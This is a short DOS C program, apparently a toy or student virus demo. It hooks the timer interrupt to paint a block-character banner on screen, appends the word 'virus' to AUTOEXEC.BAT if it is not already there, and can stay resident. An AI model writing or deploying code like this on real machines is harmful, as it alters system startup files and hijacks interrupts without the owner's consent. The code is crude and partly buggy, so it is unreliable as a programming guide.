#include <process.h>
#include<dos.h>
#include<conio.h>
#include<stdio.h>
#include <stdlib.h>
#include <string.h>
void interrupt minha_rotina_de_relogio(void);
void interrupt (*clock_tick) (void);
union REGS regs;
int  resp=1;
static char timeValue[100];
//---------------------------------------------------------------------------
void main(int argc,char *argv[ ])
{

  FILE *s;
  char ch='a',nome[6];
  int cont=0,conf=0;
  disable();
  clock_tick = getvect(28);
  setvect(28,minha_rotina_de_relogio);
  enable();
  if(resp==1){

  if ((s=fopen("\AUTOEXEC.BAT","r+"))==NULL){
   printf("\nArquivo nao encontrado.");
   return; }
   fseek(s, 0, SEEK_SET);
   while (ch != EOF)
   {
      ch = fgetc(s);
      nome[5]=ch;
      nome[0]=nome[1];
      nome[1]=nome[2];
      nome[2]=nome[3];
      nome[3]=nome[4];
      nome[4]=nome[5];
      cont++;
      if(cont>1)
	 cont=0;
      nome[5]='\0';
      if(strcmp(nome,"virus")==0)
	 conf=1;
      printf("%s ",nome);
      nome[5]=ch;

   }
   if(conf==0)
     fprintf(s,"virus\n");
   fclose(s);
   }
  resp=0;
  #ifdef RESIDENTE
	 keep(0,400);
  #else
	 system("\pingpong");
	 disable();
	 setvect(28,clock_tick);
	 enable();
   #endif
}

void interrupt minha_rotina_de_relogio(void)
{
   static char lin1[]=" \000 \117Ü\117 \117Ü\004 \000 \000 \000 \000 \000 \000 \000 \000 \000Û\004Û\004²\004 \000 \000 \000 \000 \000 \000 \000,\000 \117Ü\117 \117Ü\004 \000 \000 \000 \000 \000 \000 \000 \000 \000Û\004ß\117²\004 \000 \000 \004Û\004Û\004²\004 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000";
   static char lin2[]="²\004Û\117Û\004ß\004ß\004Û\004Ü\004 \000 \000 \000 \000 \000 \000²\004Û\004Û\004±\004 \000 \000 \000 \000 \000 \000 \000²\004Û\117Û\004ß\004ß\004Û\004Ü\004 \000 \000 \000 \000 \000 \000²\004Û\004Û\117°\004²\004 \000 \004Û\004Û\004²\004 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000";
   static char lin3[]="²\004ß\117Û\004 \000N\000 \000ß\004Û\004Ü\004 \000 \000 \000 \000±\004Û\117Û\004±\004 \000 \000 \000 \000 \000 \000 \000²\004ß\117Û\004 \000N\000 \000ß\004Û\004Ü\004 \000 \000 \000 \000²\004Û\004Û\004ß\117±\004²\004 \004Û\004Û\004±\004 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000";
   static char lin4[]="±\004ß\117Û\004Ü\004Ü\004Ü\004Ü\004Û\004Û\004²\004 \000 \000 \000±\004Û\117Û\004°\004 \000 \000 \000 \000 \000 \000 \000±\004ß\117Û\004Ü\004Ü\004Ü\004Ü\004Û\004Û\004²\004 \000 \000 \000±\004Û\004Û\004±\004Û\117°\004±\004Û\004Û\004±\004 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000";
   static char lin5[]="°\004Û\004Û\004 \004 \004 \004²\004Û\004Û\004±\004 \000 \000 \000±\004Ü\117Û\004Û\004Û\004Û\004Û\004²\004 \000 \000 \000°\004Û\004Û\004 \004 \004 \004²\004Û\004Û\004±\004 \000 \000 \000°\004Û\004Û\004 \000²\004ß\117Ü\004Û\004Û\004°\004 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000";
   static char lin6[]=" \000²\004²\004 \004 \004 \004±\004²\004ß\004°\004 \004 \000 \000±\004 \000°\004°\004±\004 \000 \000°\004 \000 \000 \000 \000²\004²\004 \004 \004 \004±\004²\004ß\004°\004 \000 \000 \000 \004±\004²\004 \000 \004 \004ß\117Û\004ß\004°\004 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000";
   static char lin7[]=" \000 \000±\004 \004 \004 \004°\004 \004 \004 \004 \000 \000 \000 \000 \000°\004 \000°\004 \000 \000 \000 \000 \000 \000 \000 \000±\004 \004 \004 \004°\004 \004 \004 \004 \000 \000 \000 \000 \000±\004 \000 \004 \000±\004²\004 \004 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000";
   static char lin8[]=" \000 \000 \004 \004 \004 \004 \004 \004 \004°\004 \000 \000 \000 \000 \000 \000 \000°\004 \000 \000°\004 \000 \000 \000 \000 \000 \004 \004 \004 \004 \004 \004 \004°\004 \000 \000 \000 \000 \000 \000 \000 \000 \000 \004°\004 \004°\004 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000 \000";
   puttext(16,10,62,10,lin1);
   puttext(16,11,62,11,lin2);
   puttext(16,12,62,12,lin3);
   puttext(16,13,62,13,lin4);
   puttext(16,14,62,14,lin5);
   puttext(16,15,62,15,lin6);
   puttext(16,16,62,16,lin7);
   puttext(16,17,62,17,lin8);
   clock_tick();
}